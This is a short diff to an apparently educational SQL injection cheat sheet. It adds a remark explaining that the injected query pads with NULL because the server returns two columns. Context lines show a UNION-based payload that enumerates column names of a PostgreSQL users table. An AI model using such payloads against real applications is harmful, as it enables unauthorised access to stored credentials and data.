@@ -197,6 +197,8 @@ MyDatabase     dbo           Users       Password     varchar
 ![image](https://github.com/th3knv/SQL_injection_cheatsheet/assets/76121926/5112fb40-80ba-4281-badf-31ab4289f463)
 
 - Going deeper (**for PostgreSQL**) we can explore the content of the table. Searching up , we will find and use an interesting table name called `users_wvtyfp`
+> As you can see (in the following command) server accepts 2 columns thats why i added ***NULL***
+
 ```sql
 ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name = 'users_wvtyfp'--
 ```
